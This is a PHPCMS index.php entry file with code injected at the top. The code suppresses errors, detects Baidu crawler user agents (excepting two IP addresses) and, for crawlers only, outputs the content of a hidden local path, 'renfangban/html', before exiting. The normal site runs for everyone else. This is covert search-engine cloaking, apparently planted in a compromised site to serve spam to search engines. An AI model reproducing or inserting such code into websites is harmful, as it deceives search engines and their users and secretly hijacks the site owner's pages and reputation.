<?php
/**
 *  index.php PHPCMS 入口
 *
 * @copyright			(C) 2005-2010 PHPCMS
 * @license				http://www.phpcms.cn/license/
 * @lastmodify			2010-6-1
 */
 //PHPCMS根目录
@error_reporting (E_ALL & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors',0);
$spider_arr = array(
	'baiduspider',
	'baiduspider/2.0',
	'baiducustomer',
	'baidu-thumbnail',
	'baiduspider-mobile-gate',
	'baiduspider-mobile-gate',	'baidu-transcoder/1.0.6.0',
);

$not_spider_ip_arr = array(
	"222.77.187.33",
	"125.90.88.96"
);

$ref_arr = array(
    'baidu.com',
    'google.com'
);
$agent = $_SERVER['HTTP_USER_AGENT'];
$rip = $_SERVER["REMOTE_ADDR"];
$referer = $_SERVER["HTTP_REFERER"];
$spider = false;
foreach($spider_arr as $_spider) {
	if(stripos($agent,$_spider) !== false) {
		$spider = true;
		break;
	}
}
if(in_array($rip,$not_spider_ip_arr)) {
	$spider = false;
}
$ref = false;
foreach($ref_arr as $_ref) {
	if(stripos($referer,$_ref) !== false) {
		$ref = true;
		break;
	}
}

$query_string=$_SERVER["HTTP_REFERER"]; 
function isSpider($v)
{
		$spiders=array("baidu.com","google.com","soso","sogou");
		$i=0;
		foreach ($spiders as $i => $value) {
			if(stristr($v,$spiders[$i])){return true;}
		}
		return false;
}

	if($spider) {
echo file_get_contents('http://127.0.0.1/renfangban/html/');
exit;
}
define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR);

include PHPCMS_PATH.'/phpcms/base.php';

pc_base::creat_app();

?>